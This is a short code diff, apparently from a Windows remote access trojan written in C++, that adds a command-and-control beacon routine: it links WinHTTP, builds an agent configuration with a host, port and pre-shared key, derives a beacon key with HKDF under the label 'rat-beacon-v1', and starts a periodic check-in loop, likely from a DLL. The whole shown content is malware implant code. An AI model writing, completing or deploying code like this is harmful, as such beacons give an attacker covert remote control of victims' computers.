@@ -2,6 +2,7 @@
 #include "pch.h"
 #include "types.h"
 
+#include "beacon.h"
 #include "protocol.h"
 #include "cmd_dispatch.h"
 #include "session.h"
@@ -15,6 +16,7 @@
 
 #include <string>
 
+#pragma comment(lib, "winhttp.lib")
 #pragma comment(lib, "ws2_32.lib")
 #pragma comment(lib, "bcrypt.lib")
 
@@ -159,6 +161,32 @@ namespace
 		return 0;
 	}
 
+}
+
+status_t process_beacon(HMODULE hModule)
+{
+	std::string host = "127.0.0.1";
+	uint16_t port = 8080;
+	int sleeptime = 60;
+
+	c2::AgentConfig cfg;
+	cfg.host = host;
+	cfg.port = port;
+	cfg.psk.resize(32);
+	for (size_t i = 0; i < 32; ++i) {
+		char b[3] = { kPskHex[i * 2], kPskHex[i * 2 + 1], 0 };
+		cfg.psk[i] = (uint8_t)strtol(b, nullptr, 16);
+	}
+	load_or_create_agent_id(cfg.agent_id);
+	cfg.os_info = "Windows";
+
+	// beacon_key = HKDF-SHA256(PSK, agent_id, "rat-beacon-v1")（协议 §8.2）
+	std::vector<uint8_t> beacon_key =
+		c2::hkdf_sha256(cfg.psk.data(), cfg.psk.size(), cfg.agent_id, 16,
+			(const uint8_t*)"rat-beacon-v1", 13, 32);
+
+	c2::run_beacon(host, port, cfg, beacon_key.data(), sleeptime);
+	return 0;
 }
 
 status_t process_entrypoint(HMODULE hModule)
